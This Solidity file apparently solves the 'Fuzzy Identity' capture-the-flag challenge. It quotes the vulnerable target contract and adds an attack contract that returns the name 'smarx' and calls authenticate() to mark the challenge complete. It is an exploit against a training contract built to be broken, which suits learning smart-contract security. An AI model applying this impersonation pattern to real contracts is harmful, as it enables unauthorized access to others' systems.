/**
pragma solidity ^0.4.21;

interface IName {
    function name() external view returns (bytes32);
}

contract FuzzyIdentityChallenge {
    bool public isComplete;

    function authenticate() public {
        require(isSmarx(msg.sender));
        require(isBadCode(msg.sender));

        isComplete = true;
    }

    function isSmarx(address addr) internal view returns (bool) {
        return IName(addr).name() == bytes32("smarx");
    }

    function isBadCode(address _addr) internal pure returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IFuzzyIdentityChallenge {
    function authenticate() external;
}

contract AttackFuzzyIdentity {
    IFuzzyIdentityChallenge targetContract;

    event Succeed(uint256);

    constructor(address target) {
        targetContract = IFuzzyIdentityChallenge(target);
    }

    function name() external pure returns (bytes32) {
        return bytes32("smarx");
    }

    function attack() external {
        targetContract.authenticate();

        emit Succeed(block.timestamp);
    }
}